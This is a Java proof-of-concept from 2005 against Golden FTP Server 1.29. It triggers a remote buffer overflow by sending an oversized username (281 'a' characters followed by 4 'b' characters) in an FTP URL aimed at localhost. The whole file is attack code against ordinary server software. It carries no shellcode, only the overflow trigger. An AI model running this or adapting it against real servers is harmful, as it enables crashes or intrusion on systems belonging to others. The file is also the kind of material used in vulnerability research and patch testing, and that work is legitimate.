/* Carlos Ulver at gmail.com
 * www.debarry2.com.br/carlos
 * 03/01/05
 * Golden Ftp Server 1.29(Freeware Version) Username Remote Buffer Overflow
 * This is only a proof of Concept.
 * This Ftpd was running in windows xp sp1 Portuguese(Brazilian)
 *
 */
import java.net.URL;
public class Pocgftpd {


        public static void main(String[] args) {
                String A = new String();

                for(int i=0;i<281;i++) A+='a';
                for (int i = 0; i < 4; i++) A+='b';

        try{
                //This 'a' for password means nothing...only to complete: user:pass@host
                URL u = new URL("ftp://"+A+":a@127.0.0.1");
                u.openStream();
                }catch(Exception E1){}

        }
}

